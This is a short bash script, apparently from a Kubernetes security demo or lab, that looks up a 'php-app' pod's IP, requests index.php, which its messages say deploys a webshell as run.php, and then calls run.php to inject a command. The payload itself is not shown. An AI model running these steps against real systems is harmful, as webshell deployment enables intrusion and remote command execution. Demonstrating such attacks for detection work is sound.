#!/bin/bash

echo "Getting php-app service endpoint"
export ip=`kubectl get pods php-app -o jsonpath='{.status.podIP}'`
echo $ip

echo
echo "Accessing index.php and deploying webshell as run.php"
curl http://$ip/

echo
echo "Injecting command through the webshell run.php"

curl http://$ip/run.php
